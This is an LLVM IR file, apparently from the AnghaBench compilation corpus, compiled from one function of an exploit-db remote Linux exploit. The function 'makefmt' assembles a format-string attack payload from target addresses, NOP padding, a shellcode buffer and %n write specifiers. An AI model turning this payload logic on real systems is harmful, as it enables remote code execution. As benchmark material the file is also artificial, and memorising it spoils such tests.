; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_22135.c_makefmt.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_22135.c_makefmt.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@x0x_test2 = common dso_local global i32 0, align 4
@x0x_test3 = common dso_local global i32 0, align 4
@x82x82x82 = common dso_local global i64 0, align 8
@x0x_test1 = common dso_local global i32 0, align 4
@shellcode = common dso_local global i8* null, align 8
@stdout = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [25 x i8] c" [2] Pushing Shellcode.\0A\00", align 1
@.str.1 = private unnamed_addr constant [28 x i8] c" [-] Shellcode address: %p\0A\00", align 1
@.str.2 = private unnamed_addr constant [63 x i8] c"@%s%%%d$%ux%%%d$n%%%d$%ux%%%d$n%%%d$%ux%%%d$n%%%d$%ux%%%d$n%s\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @makefmt(i32 %0, i32 %1, i32 %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i64, align 8
  %10 = alloca i64, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i32 %1, i32* %6, align 4
  store i32 %2, i32* %7, align 4
  %21 = load i32, i32* @x0x_test2, align 4
  %22 = zext i32 %21 to i64
  %23 = call i8* @llvm.stacksave()
  store i8* %23, i8** %8, align 8
  %24 = alloca i8, i64 %22, align 16
  store i64 %22, i64* %9, align 8
  %25 = load i32, i32* @x0x_test3, align 4
  %26 = zext i32 %25 to i64
  %27 = alloca i8, i64 %26, align 16
  store i64 %26, i64* %10, align 8
  store i32 0, i32* %16, align 4
  store i32 0, i32* %15, align 4
  store i32 0, i32* %14, align 4
  store i32 0, i32* %13, align 4
  store i32 0, i32* %12, align 4
  store i32 0, i32* %11, align 4
  store i32 0, i32* %20, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %18, align 4
  store i32 0, i32* %17, align 4
  %28 = load i64, i64* @x82x82x82, align 8
  %29 = inttoptr i64 %28 to i8*
  %30 = load i32, i32* @x0x_test1, align 4
  %31 = call i32 @memset(i8* %29, i32 0, i32 %30)
  %32 = load i32, i32* @x0x_test2, align 4
  %33 = call i32 @memset(i8* %24, i32 0, i32 %32)
  %34 = load i32, i32* @x0x_test3, align 4
  %35 = call i32 @memset(i8* %27, i32 0, i32 %34)
  %36 = getelementptr inbounds i8, i8* %27, i64 0
  %37 = bitcast i8* %36 to i64*
  store i64 2189591170, i64* %37, align 16
  %38 = load i32, i32* %5, align 4
  %39 = add nsw i32 %38, 0
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds i8, i8* %27, i64 4
  %42 = bitcast i8* %41 to i64*
  store i64 %40, i64* %42, align 4
  %43 = getelementptr inbounds i8, i8* %27, i64 8
  %44 = bitcast i8* %43 to i64*
  store i64 2189591170, i64* %44, align 8
  %45 = load i32, i32* %5, align 4
  %46 = add nsw i32 %45, 1
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds i8, i8* %27, i64 12
  %49 = bitcast i8* %48 to i64*
  store i64 %47, i64* %49, align 4
  %50 = getelementptr inbounds i8, i8* %27, i64 16
  %51 = bitcast i8* %50 to i64*
  store i64 2189591170, i64* %51, align 16
  %52 = load i32, i32* %5, align 4
  %53 = add nsw i32 %52, 2
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds i8, i8* %27, i64 20
  %56 = bitcast i8* %55 to i64*
  store i64 %54, i64* %56, align 4
  %57 = getelementptr inbounds i8, i8* %27, i64 24
  %58 = bitcast i8* %57 to i64*
  store i64 2189591170, i64* %58, align 8
  %59 = load i32, i32* %5, align 4
  %60 = add nsw i32 %59, 3
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds i8, i8* %27, i64 28
  %63 = bitcast i8* %62 to i64*
  store i64 %61, i64* %63, align 4
  %64 = load i32, i32* %6, align 4
  %65 = ashr i32 %64, 24
  %66 = and i32 %65, 255
  store i32 %66, i32* %13, align 4
  %67 = load i32, i32* %6, align 4
  %68 = ashr i32 %67, 16
  %69 = and i32 %68, 255
  store i32 %69, i32* %14, align 4
  %70 = load i32, i32* %6, align 4
  %71 = ashr i32 %70, 8
  %72 = and i32 %71, 255
  store i32 %72, i32* %15, align 4
  %73 = load i32, i32* %6, align 4
  %74 = ashr i32 %73, 0
  %75 = and i32 %74, 255
  store i32 %75, i32* %16, align 4
  %76 = load i32, i32* %6, align 4
  %77 = ashr i32 %76, 24
  %78 = and i32 %77, 255
  store i32 %78, i32* %17, align 4
  %79 = load i32, i32* %6, align 4
  %80 = ashr i32 %79, 16
  %81 = and i32 %80, 255
  store i32 %81, i32* %18, align 4
  %82 = load i32, i32* %6, align 4
  %83 = ashr i32 %82, 8
  %84 = and i32 %83, 255
  store i32 %84, i32* %19, align 4
  %85 = load i32, i32* %6, align 4
  %86 = ashr i32 %85, 0
  %87 = and i32 %86, 255
  store i32 %87, i32* %20, align 4
  %88 = load i32, i32* %20, align 4
  %89 = sub nsw i32 %88, 40
  %90 = icmp slt i32 %89, 10
  br i1 %90, label %91, label %94

91:                                               ; preds = %3
  %92 = load i32, i32* %16, align 4
  %93 = add nsw i32 %92, 256
  store i32 %93, i32* %16, align 4
  br label %94

94:                                               ; preds = %91, %3
  %95 = load i32, i32* %19, align 4
  %96 = load i32, i32* %20, align 4
  %97 = sub nsw i32 %95, %96
  %98 = icmp slt i32 %97, 10
  br i1 %98, label %99, label %102

99:                                               ; preds = %94
  %100 = load i32, i32* %15, align 4
  %101 = add nsw i32 %100, 256
  store i32 %101, i32* %15, align 4
  br label %102

102:                                              ; preds = %99, %94
  %103 = load i32, i32* %18, align 4
  %104 = load i32, i32* %19, align 4
  %105 = sub nsw i32 %103, %104
  %106 = icmp slt i32 %105, 10
  br i1 %106, label %107, label %110

107:                                              ; preds = %102
  %108 = load i32, i32* %14, align 4
  %109 = add nsw i32 %108, 256
  store i32 %109, i32* %14, align 4
  br label %110

110:                                              ; preds = %107, %102
  store i32 0, i32* %11, align 4
  br label %111

111:                                              ; preds = %121, %110
  %112 = load i32, i32* %11, align 4
  %113 = load i8*, i8** @shellcode, align 8
  %114 = call i32 @strlen(i8* %113)
  %115 = sub nsw i32 320, %114
  %116 = icmp slt i32 %112, %115
  br i1 %116, label %117, label %124

117:                                              ; preds = %111
  %118 = load i32, i32* %11, align 4
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds i8, i8* %24, i64 %119
  store i8 78, i8* %120, align 1
  br label %121

121:                                              ; preds = %117
  %122 = load i32, i32* %11, align 4
  %123 = add nsw i32 %122, 1
  store i32 %123, i32* %11, align 4
  br label %111

124:                                              ; preds = %111
  store i32 0, i32* %12, align 4
  br label %125

125:                                              ; preds = %140, %124
  %126 = load i32, i32* %12, align 4
  %127 = load i8*, i8** @shellcode, align 8
  %128 = call i32 @strlen(i8* %127)
  %129 = icmp slt i32 %126, %128
  br i1 %129, label %130, label %143

130:                                              ; preds = %125
  %131 = load i8*, i8** @shellcode, align 8
  %132 = load i32, i32* %12, align 4
  %133 = sext i32 %132 to i64
  %134 = getelementptr inbounds i8, i8* %131, i64 %133
  %135 = load i8, i8* %134, align 1
  %136 = load i32, i32* %11, align 4
  %137 = add nsw i32 %136, 1
  store i32 %137, i32* %11, align 4
  %138 = sext i32 %136 to i64
  %139 = getelementptr inbounds i8, i8* %24, i64 %138
  store i8 %135, i8* %139, align 1
  br label %140

140:                                              ; preds = %130
  %141 = load i32, i32* %12, align 4
  %142 = add nsw i32 %141, 1
  store i32 %142, i32* %12, align 4
  br label %125

143:                                              ; preds = %125
  %144 = load i32, i32* @stdout, align 4
  %145 = call i32 (i32, i8*, ...) @fprintf(i32 %144, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str, i64 0, i64 0))
  %146 = load i32, i32* @stdout, align 4
  %147 = load i32, i32* %6, align 4
  %148 = call i32 (i32, i8*, ...) @fprintf(i32 %146, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.1, i64 0, i64 0), i32 %147)
  %149 = load i64, i64* @x82x82x82, align 8
  %150 = load i32, i32* @x0x_test1, align 4
  %151 = load i32, i32* %7, align 4
  %152 = add nsw i32 %151, 0
  %153 = sext i32 %152 to i64
  %154 = load i32, i32* %16, align 4
  %155 = sub nsw i32 %154, 40
  %156 = load i32, i32* %7, align 4
  %157 = add nsw i32 %156, 1
  %158 = load i32, i32* %7, align 4
  %159 = add nsw i32 %158, 2
  %160 = load i32, i32* %15, align 4
  %161 = load i32, i32* %20, align 4
  %162 = sub nsw i32 %160, %161
  %163 = load i32, i32* %7, align 4
  %164 = add nsw i32 %163, 3
  %165 = load i32, i32* %7, align 4
  %166 = add nsw i32 %165, 4
  %167 = load i32, i32* %14, align 4
  %168 = load i32, i32* %19, align 4
  %169 = sub nsw i32 %167, %168
  %170 = load i32, i32* %7, align 4
  %171 = add nsw i32 %170, 5
  %172 = load i32, i32* %7, align 4
  %173 = add nsw i32 %172, 6
  %174 = load i32, i32* %13, align 4
  %175 = add nsw i32 256, %174
  %176 = load i32, i32* %18, align 4
  %177 = sub nsw i32 %175, %176
  %178 = load i32, i32* %7, align 4
  %179 = add nsw i32 %178, 7
  %180 = call i32 @snprintf(i64 %149, i32 %150, i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.2, i64 0, i64 0), i8* %27, i64 %153, i32 %155, i32 %157, i32 %159, i32 %162, i32 %164, i32 %166, i32 %169, i32 %171, i32 %173, i32 %177, i32 %179, i8* %24)
  %181 = load i8*, i8** %8, align 8
  call void @llvm.stackrestore(i8* %181)
  %182 = load i32, i32* %4, align 4
  ret i32 %182
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @fprintf(i32, i8*, ...) #2

declare dso_local i32 @snprintf(i64, i32, i8*, i8*, i64, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i8*) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
